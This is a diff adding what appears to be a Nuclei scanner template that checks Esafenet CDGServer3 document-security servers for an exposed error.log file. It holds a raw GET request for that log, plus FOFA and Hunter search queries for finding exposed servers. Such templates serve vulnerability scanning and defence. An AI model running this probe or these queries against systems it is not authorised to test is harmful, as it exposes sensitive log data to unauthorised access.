@@ -1,0 +1,27 @@
+id: esafenet-cdgserver3-error-log-disclosure
+
+info:
+  name: 亿赛通文档安全管理系统 - 日志文件敏感信息泄露
+  author: pphua
+  severity: medium
+  description: 亿赛通文档安全管理系统/CDGServer3/logs/error.log日志信息泄露
+  metadata:
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
+  tags: esafenet,disclosure
+
+http:
+  - raw:
+      - |
+        GET /CDGServer3/logs/error.log HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: word
+        words:
+          - "esafenet"
+        part: body
